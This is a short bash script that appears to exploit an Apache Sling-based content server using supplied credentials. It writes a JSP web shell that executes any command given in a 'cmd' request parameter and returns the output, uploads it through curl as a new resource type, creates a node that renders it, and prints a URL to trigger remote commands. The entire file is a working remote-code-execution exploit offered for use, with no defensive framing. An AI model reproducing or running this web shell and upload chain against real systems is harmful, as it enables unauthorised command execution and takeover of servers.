#!/usr/bin/bash

if [ "$#" -ne 3 ]; then
	echo "Usage: $0 URL USERNAME PASSWORD"
	exit 2
fi

url="$1"
username="$2"
password="$3"

payload=$(cat <<-EOT
<%@ page import="java.io.*" %>
<% 
	Process proc = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

	StringBuilder sb = new StringBuilder();
	String s = null;
	while ((s = stdInput.readLine()) != null) {
		sb.append(s + "\\\\n");
	}
	
	String output = sb.toString();
%>

<%=output %>
EOT
)

echo "$payload" > /tmp/html.jsp

#Create rcetype
curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/apps/rcetype" -Fhtml.jsp=@/tmp/html.jsp > /dev/null

# Create rcenode
curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/rcenode" -Fsling:resourceType=rcetype > /dev/null

echo "Now navigate to $url/rcenode.html?cmd=ifconfig"
